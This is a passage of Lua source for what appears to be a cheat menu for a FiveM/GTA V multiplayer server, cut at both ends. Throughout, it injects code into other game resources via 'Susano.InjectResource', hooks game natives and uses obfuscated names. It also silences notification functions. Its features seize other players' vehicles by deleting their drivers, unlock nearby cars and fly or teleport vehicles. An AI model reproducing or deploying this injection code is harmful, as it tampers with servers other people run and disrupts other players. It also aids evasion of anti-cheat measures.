                                local myCoords = GetEntityCoords(veh)
                                local vehHandle, otherVeh = FindFirstVehicle()
                                local success
                                
                                repeat
                                    if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                        local otherCoords = GetEntityCoords(otherVeh)
                                        local distance = #(myCoords - otherCoords)
                                        
                                        if distance < 50.0 then
                                            SetEntityNoCollisionEntity(veh, otherVeh, true)
                                            SetEntityNoCollisionEntity(otherVeh, veh, true)
                                        end
                                    end
                                    
                                    success, otherVeh = FindNextVehicle(vehHandle)
                                until not success
                                
                                EndFindVehicle(vehHandle)
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    else
        if enable then
            rawset(_G, 'no_vehicle_collision_active', true)
            
            CreateThread(function()
                while rawget(_G, 'no_vehicle_collision_active') do
                    Wait(0)
                    
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetEntityNoCollisionEntity(veh, veh, false)
                            
                            local myCoords = GetEntityCoords(veh)
                            local vehHandle, otherVeh = FindFirstVehicle()
                            local success
                            
                            repeat
                                if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                    local otherCoords = GetEntityCoords(otherVeh)
                                    local distance = #(myCoords - otherCoords)
                                    
                                    if distance < 50.0 then
                                        SetEntityNoCollisionEntity(veh, otherVeh, true)
                                        SetEntityNoCollisionEntity(otherVeh, veh, true)
                                    end
                                end
                                
                                success, otherVeh = FindNextVehicle(vehHandle)
                            until not success
                            
                            EndFindVehicle(vehHandle)
                        end
                    end
                end
            end)
        else
            rawset(_G, 'no_vehicle_collision_active', false)
        end
    end
end

local function ToggleBunnyHop(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("ApplyForceToEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetGameTimer", function(originalFn, ...) return originalFn(...) end)
            
            if not _G.bunny_hop_active then
                _G.bunny_hop_active = false
            end
            _G.bunny_hop_active = %s
            
            if _G.bunny_hop_active then
                CreateThread(function()
                    local lastJumpTime = 0
                    while _G.bunny_hop_active do
                        Wait(0)
                        
                        local ped = PlayerPedId()
                        if IsPedInAnyVehicle(ped, false) then
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and veh ~= 0 then
                                local currentTime = GetGameTimer()
                                if IsControlJustPressed(0, 22) and (currentTime - lastJumpTime) > 200 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                    end
                                    
                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, 12.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                    lastJumpTime = currentTime
                                end
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    else
        if enable then
            rawset(_G, 'bunny_hop_active', true)
            
            CreateThread(function()
                local lastJumpTime = 0
                while rawget(_G, 'bunny_hop_active') do
                    Wait(0)
                    
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            local currentTime = GetGameTimer()
                            if IsControlJustPressed(0, 22) and (currentTime - lastJumpTime) > 200 then
                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                end
                                
                                ApplyForceToEntity(veh, 1, 0.0, 0.0, 12.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                lastJumpTime = currentTime
                            end
                        end
                    end
                end
            end)
        else
            rawset(_G, 'bunny_hop_active', false)
        end
    end
end


function Menu.ActionChangePlate()
    if Menu and Menu.OpenInput then
        Menu.OpenInput("Change Plate", "Entrez le texte de la plaque (max 8 caractÃ¨res):", function(input)
            if input and input ~= "" then
                local plateText = string.sub(input, 1, 8)
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("any", string.format([[
                        local playerPed = PlayerPedId()
                        if not playerPed or not DoesEntityExist(playerPed) then return end

                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        if vehicle == 0 or not DoesEntityExist(vehicle) then
                            local coords = GetEntityCoords(playerPed)
                            vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                        end

                        if vehicle ~= 0 and DoesEntityExist(vehicle) then
                            SetVehicleNumberPlateText(vehicle, "%s")
                            SetVehicleNumberPlateTextIndex(vehicle, 0)
                        end
                    ]], plateText))
                end
            end
        end)
    end
end


function Menu.ActionCleanVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                local coords = GetEntityCoords(playerPed)
                vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
            end
            
            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetVehicleDirtLevel(vehicle, 0.0)
                WashDecalsFromVehicle(vehicle, 1.0)
                SetVehicleFixed(vehicle)
                SetVehicleDeformationFixed(vehicle)
                SetVehicleUndriveable(vehicle, false)
                SetVehicleEngineOn(vehicle, true, true, false)
            end
        ]])
    end
end

function Menu.ActionFlipVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local function vXmYLT9pq2()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetEntityHeading
                local d = SetEntityRotation

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    d(veh, 0.0, 0.0, c(veh))
                end
            end

            vXmYLT9pq2()
        ]])
    end
end

local function ToggleBackFlip(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if BackFlipEnabled == nil then BackFlipEnabled = false end
            BackFlipEnabled = %s

            if BackFlipEnabled then
                CreateThread(function()
                    while BackFlipEnabled and not Unloaded do
                        Wait(0)

                        if IsControlJustPressed(0, 22) then 
                            local playerPed = PlayerPedId()
                            local playerVeh = GetVehiclePedIsIn(playerPed, true)

                            if DoesEntityExist(playerVeh) then
                                ApplyForceToEntity(
                                    playerVeh,
                                    1,
                                    0.0, 0.0, 15.0,   
                                    0.0, 60.0, 0.0,   
                                    0,
                                    false, true, true, false, true
                                )
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    end
end

function Menu.ActionNPCDrive()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_busy') then return end
    rawset(_G, 'warp_boost_busy', true)

    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end

    if not targetPlayerId then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local takeoverSuccess = false
    local tStart = GetGameTimer()

    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end

    if takeoverSuccess then
        Wait(500)
        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
        SetEntityHeading(playerPed, initialHeading)

        if DoesEntityExist(targetVehicle) then
            RequestControl(targetVehicle, 1000)

            local model = GetHashKey("s_m_y_marine_01")
            RequestModel(model)
            local tModel = GetGameTimer()
            while not HasModelLoaded(model) and (GetGameTimer() - tModel) < 2000 do Wait(0) end

            if HasModelLoaded(model) then
                local npc = CreatePedInsideVehicle(targetVehicle, 4, model, -1, false, false)

                if not DoesEntityExist(npc) then
                    local vehCoords = GetEntityCoords(targetVehicle)
                    npc = CreatePed(4, model, vehCoords.x, vehCoords.y, vehCoords.z + 2.0, 0.0, false, false)
                    if DoesEntityExist(npc) then
                        SetPedIntoVehicle(npc, targetVehicle, -1)
                    end
                end

                if DoesEntityExist(npc) then
                    SetEntityAsMissionEntity(npc, true, false)
                    SetBlockingOfNonTemporaryEvents(npc, true)
                    SetPedRandomComponentVariation(npc, 0)

                    Wait(200)
                    TaskVehicleDriveWander(npc, targetVehicle, 30.0, 786603)
                end
            end
        end
    else
        local dist = #(GetEntityCoords(playerPed) - initialCoords)
        if dist > 10.0 then
            SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
        end
    end

    rawset(_G, 'warp_boost_busy', false)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionDeleteVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                local coords = GetEntityCoords(playerPed)
                vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
            end
            
            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 50 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                DeleteEntity(vehicle)
            end
        ]])
    end
end

CreateThread(function()
    while true do
        Wait(500)
        if Menu.unlockAllVehicleEnabled then
            local ped = PlayerPedId()
            if IsPedOnFoot(ped) then
                local pos = GetEntityCoords(ped)
                local veh = GetClosestVehicle(pos, 3.5, 0, 70)

                if veh ~= 0 then
                    local locked = GetVehicleDoorLockStatus(veh)

                    if locked > 1 then
                        SetVehicleDoorsLocked(veh, 1)
                        SetVehicleDoorsLockedForAllPlayers(veh, false)
                        SetVehicleDoorsLockedForPlayer(veh, PlayerId(), false)
                    end
                end
            end
    end
end
end)

function Menu.ActionTeleportIntoClosestVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            
            if IsPedInAnyVehicle(playerPed, false) then return end
            
            local coords = GetEntityCoords(playerPed)
            local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 200.0, 0, 70)
            
            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 100 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                
                local freeSeat = -1
                local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)
                
                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    freeSeat = -1
                else
                    for i = 0, maxSeats - 1 do
                        if GetPedInVehicleSeat(vehicle, i) == 0 then
                            freeSeat = i
                            break
                        end
                    end
                end
                
                if freeSeat ~= -1 then
                    ClearPedTasksImmediately(playerPed)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    Wait(100)
                    
                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        local vehicleCoords = GetEntityCoords(vehicle)
                        SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                        Wait(50)
                        SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    end
                    
                else
                end
            else
            end
        ]])
    end
end

function Menu.ActionGiveNearestVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            
            local coords = GetEntityCoords(playerPed)
            local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 200.0, 0, 70)
            
            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 100 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                
                local freeSeat = -1
                local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)
                
                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    freeSeat = -1
                else
                    for i = 0, maxSeats - 1 do
                        if GetPedInVehicleSeat(vehicle, i) == 0 then
                            freeSeat = i
                            break
                        end
                    end
                end
                
                if freeSeat ~= -1 then
                    ClearPedTasksImmediately(playerPed)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    Wait(100)
                    
                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        local vehicleCoords = GetEntityCoords(vehicle)
                        SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                        Wait(50)
                        SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    end
                    
                    Wait(200)
                    if IsPedInVehicle(playerPed, vehicle, false) then
                        SetEntityCoordsNoOffset(vehicle, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                        SetEntityHeading(vehicle, playerHeading)
                        SetVehicleOnGroundProperly(vehicle)
                        SetVehicleEngineOn(vehicle, true, true, false)
                        
                        local networkId = NetworkGetNetworkIdFromEntity(vehicle)
                        if networkId ~= 0 then
                            SetNetworkIdCanMigrate(networkId, true)
                            SetNetworkIdExistsOnAllMachines(networkId, true)
                        end
                        
                    end
                else
                end
            else
            end
        ]])
    end
end


Actions.changePlateItem = FindItem("Vehicle", "Performance", "Change Plate")
if Actions.changePlateItem then
    Actions.changePlateItem.onClick = function()
        Menu.ActionChangePlate()
    end
end

Actions.cleanVehicleItem = FindItem("Vehicle", "Performance", "Clean Vehicle")
if Actions.cleanVehicleItem then
    Actions.cleanVehicleItem.onClick = function()
        Menu.ActionCleanVehicle()
    end
end

Actions.flipVehicleItem = FindItem("Vehicle", "Performance", "Flip Vehicle")
if Actions.flipVehicleItem then
    Actions.flipVehicleItem.onClick = function()
        Menu.ActionFlipVehicle()
    end
end

Actions.deleteVehicleItem = FindItem("Vehicle", "Performance", "Delete Vehicle")
if Actions.deleteVehicleItem then
    Actions.deleteVehicleItem.onClick = function()
        Menu.ActionDeleteVehicle()
    end
end

Actions.unlockAllVehicleItem = FindItem("Vehicle", "Performance", "Unlock All Vehicle")
if Actions.unlockAllVehicleItem then
    Actions.unlockAllVehicleItem.onClick = function(value)
        Menu.unlockAllVehicleEnabled = value
    end
end

Actions.teleportIntoItem = FindItem("Vehicle", "Performance", "Teleport into Closest Vehicle")
if Actions.teleportIntoItem then
    Actions.teleportIntoItem.onClick = function()
        Menu.ActionTeleportIntoClosestVehicle()
    end
end

Actions.giveNearestItem = FindItem("Vehicle", "Performance", "Give Nearest Vehicle")
if Actions.giveNearestItem then
    Actions.giveNearestItem.onClick = function()
        Menu.ActionGiveNearestVehicle()
    end
end


Actions.giveRampWallItem = FindItem("Vehicle", "Performance", "Give")
if Actions.giveRampWallItem and Actions.giveRampWallItem.type == "selector" then
    Actions.giveRampWallItem.onClick = function(index, option)
        if index == 1 then
            RampVehicle()
        elseif index == 2 then
            WallVehicle()
        elseif index == 3 then
            Wall2Vehicle()
        end
    end
end

Actions.rainbowPaintItem = FindItem("Vehicle", "Performance", "Rainbow Paint")
if Actions.rainbowPaintItem then
    Actions.rainbowPaintItem.onClick = function(value)
        ToggleRainbowPaint(value)
    end
end


Actions.noCollisionItem = FindItem("Vehicle", "Performance", "No Collision")
if Actions.noCollisionItem then
    Actions.noCollisionItem.onClick = function(value)
        ToggleNoCollision(value)
    end
end

Actions.bunnyHopItem = FindItem("Vehicle", "Performance", "Bunny Hop")
if Actions.bunnyHopItem then
    Actions.bunnyHopItem.onClick = function(value)
        ToggleBunnyHop(value)
    end
end

Actions.backFlipItem = FindItem("Vehicle", "Performance", "Back Flip")
if Actions.backFlipItem then
    Actions.backFlipItem.onClick = function(value)
        ToggleBackFlip(value)
    end
end

Actions.shiftBoostItem = FindItem("Vehicle", "Performance", "Shift Boost")
if Actions.shiftBoostItem then
    Actions.shiftBoostItem.onClick = function(value)
        ToggleShiftBoost(value)
    end
end

local function ToggleGravitateVehicle(enable, speed)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    if enable then
        speed = speed or 100
        local injectionCode = [[
            if PqLmYgZxWvTrHs == nil then PqLmYgZxWvTrHs = false end
            PqLmYgZxWvTrHs = true
            
            VehicleSpeed = 0.0
            VehicleMaxSpeed = ]] .. tostring(speed) .. [[.0
            VehicleMinSpeed = 1.0
            VehicleSpeedMultiplier = 1.0
            VehicleBaseSpeed = ]] .. tostring(speed) .. [[.0
            VehicleAcceleration = ]] .. tostring(math.max(1.0, speed / 100.0)) .. [[
            VehicleFollowCamera = true
            VerticalFlyingEnabled = true
            
            local player = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(player, false)
            if vehicle and vehicle ~= 0 then
                SetVehicleGravityAmount(vehicle, 9.8)
                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end
                SetVehicleFixed(vehicle)
            end
            
            local function NormalizeVector(x, y, z)
                local length = math.sqrt(x*x + y*y + z*z)
                if length > 0 then
                    return x/length, y/length, z/length
                else
                    return 0.0, 0.0, 0.0
                end
            end

            local function DegToRad(deg)
                return deg * math.pi / 180.0
            end

            local function VkEyTrXpZdQl()
                SetTextEntry = function() end
                AddTextComponentString = function() end
                DrawNotification = function() return false end
                BeginTextCommandDisplayText = function() end
                EndTextCommandDisplayText = function() end
                AddTextComponentSubstringPlayerName = function() end
                
                CreateThread(function()
                    local lastKeyPress = 0
                    local helpShown = false
                    local activeControls = false
                    local lastVehicle = nil
                    
                    while PqLmYgZxWvTrHs do
                        local PlayerPedIdFunc = PlayerPedId
                        local GetVehiclePedIsInFunc = GetVehiclePedIsIn
                        local SetVehicleGravityAmountFunc = SetVehicleGravityAmount
                        local SetEntityRotationFunc = SetEntityRotation
                        local GetEntityRotationFunc = GetEntityRotation
                        local FreezeEntityPositionFunc = FreezeEntityPosition
                        local GetGameCamRotFunc = GetGameplayCamRot
                        local SetEntityVelocityFunc = SetEntityVelocity

                        local player = PlayerPedIdFunc()
                        local vehicle = GetVehiclePedIsInFunc(player, false)
                        
                        if vehicle ~= lastVehicle then
                            if lastVehicle and lastVehicle ~= 0 then
                                SetVehicleGravityAmountFunc(lastVehicle, 9.8)
                                SetVehicleFixed(lastVehicle)
                                NetworkRequestControlOfEntity(lastVehicle)
                                if IsEntityPositionFrozen(lastVehicle) then
                                    FreezeEntityPosition(lastVehicle, false)
                                end
                                ModifyVehicleTopSpeed(lastVehicle, 1.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                SetVehicleOnGroundProperly(lastVehicle)
                                SetEntityVelocity(lastVehicle, 0.0, 0.0, 0.0)
                            end
                            
                            if vehicle and vehicle ~= 0 then
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleFixed(vehicle)
                                NetworkRequestControlOfEntity(vehicle)
                                if not activeControls then
                                    ModifyVehicleTopSpeed(vehicle, 1.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                end
                            end
                            
                            lastVehicle = vehicle
                        end
                        
                        if vehicle and vehicle ~= 0 then
                            local shiftPressed = IsControlPressed(0, 21)
                            if shiftPressed and not activeControls then
                                activeControls = true
                            elseif not shiftPressed and activeControls then
                                activeControls = false
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                SetVehicleFixed(vehicle)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                ModifyVehicleTopSpeed(vehicle, 1.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                if not IsVehicleOnAllWheels(vehicle) and GetEntitySpeed(vehicle) < 0.5 then
                                    SetVehicleOnGroundProperly(vehicle)
                                end
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsControlJustPressed(0, 15) then
                                VehicleSpeedMultiplier = math.min(VehicleSpeedMultiplier + 0.5, 10.0)
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsControlJustPressed(0, 14) then
                                VehicleSpeedMultiplier = math.max(VehicleSpeedMultiplier - 0.5, 0.1)
                                lastKeyPress = GetGameTimer()
                            end
                            
                            for i = 1, 9 do
                                if IsControlJustPressed(0, 48 + i) then
                                    VehicleMaxSpeed = (VehicleBaseSpeed / 10.0) * i * VehicleSpeedMultiplier
                                    lastKeyPress = GetGameTimer()
                                end
                            end
                            
                            if IsControlJustPressed(0, 48) then
                                VehicleMaxSpeed = 0.0
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsControlJustPressed(0, 19) then
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleFixed(vehicle)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                SetVehicleOnGroundProperly(vehicle)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, GetEntityHeading(vehicle), 2, true)
                                ModifyVehicleTopSpeed(vehicle, 1.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                SetVehicleEngineHealth(vehicle, 1000.0)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                SetVehicleUndriveable(vehicle, false)
                                activeControls = false
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if not helpShown then
                                lastKeyPress = GetGameTimer()
                                helpShown = true
                            end
                            
                            local camRotation = GetGameCamRotFunc(0)
                            local camPitch = DegToRad(camRotation.x)
                            local camYaw = DegToRad(camRotation.z)
                            
                            local lookDirection = {
                                x = -math.sin(camYaw) * math.cos(camPitch),
                                y = math.cos(camYaw) * math.cos(camPitch),
                                z = math.sin(camPitch)
                            }
                            
                            if activeControls then
                                if IsControlPressed(0, 32) then
                                    VehicleSpeed = math.min(VehicleSpeed + VehicleAcceleration, VehicleMaxSpeed)
                                elseif IsControlPressed(0, 33) then
                                    VehicleSpeed = math.max(VehicleSpeed - VehicleAcceleration * 2, -VehicleMaxSpeed / 2)
                                else
                                    if VehicleSpeed > 0 then
                                        VehicleSpeed = math.max(0, VehicleSpeed - VehicleAcceleration * 0.5)
                                    elseif VehicleSpeed < 0 then
                                        VehicleSpeed = math.min(0, VehicleSpeed + VehicleAcceleration * 0.5)
                                    end
                                end
                            else
                                if IsControlPressed(0, 32) then
                                    VehicleSpeed = math.min(VehicleSpeed + VehicleAcceleration * 0.5, VehicleMaxSpeed / 2)
                                elseif IsControlPressed(0, 33) then
                                    VehicleSpeed = math.max(VehicleSpeed - VehicleAcceleration, -VehicleMaxSpeed / 4)
                                else
                                    if VehicleSpeed > 0 then
                                        VehicleSpeed = math.max(0, VehicleSpeed - VehicleAcceleration * 0.75)
                                    elseif VehicleSpeed < 0 then
                                        VehicleSpeed = math.min(0, VehicleSpeed + VehicleAcceleration * 0.75)
                                    end
                                end
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                            end
                            
                            local directionX, directionY, directionZ
                            
                            if VehicleFollowCamera then
                                directionX = lookDirection.x
                                directionY = lookDirection.y
                                directionZ = lookDirection.z
                                
                                if activeControls then
                                    local camRot = GetGameCamRotFunc(0)
                                    local targetHeading = camRot.z
                                    SetEntityHeading(vehicle, targetHeading)
                                end
                            else
                                local camRotation = GetGameCamRotFunc(0)
                                local camYaw = DegToRad(camRotation.z)
                                directionX = -math.sin(camYaw)
                                directionY = math.cos(camYaw)
                                directionZ = 0.0
                            end
                            
                            if activeControls then
                                if IsControlPressed(0, 44) then
                                    directionZ = directionZ + 0.5
                                end
                            end
                            
                            if IsControlJustPressed(0, 45) then
                                local coords = GetEntityCoords(player)
                                SetEntityCoords(vehicle, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, 0.0, 2, true)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsControlJustPressed(0, 23) then
                                if IsPedInAnyVehicle(player, false) then
                                    SetVehicleGravityAmountFunc(vehicle, 9.8)
